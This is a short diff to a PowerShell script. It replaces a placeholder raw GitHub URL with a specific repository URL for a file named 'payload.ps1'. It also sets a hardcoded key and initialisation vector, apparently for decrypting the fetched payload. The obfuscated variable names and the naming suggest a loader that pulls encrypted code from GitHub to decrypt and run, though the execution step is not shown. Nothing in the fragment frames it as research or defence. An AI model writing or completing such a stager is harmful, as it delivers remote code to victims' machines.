@@ -5,7 +5,7 @@
 # ----------------------------------------
 
 # REPLACE THIS WITH YOUR ACTUAL RAW GITHUB URL
-$gH = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.bin" 
+$gH = "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.ps1" 
 
 $kY = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
 $iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
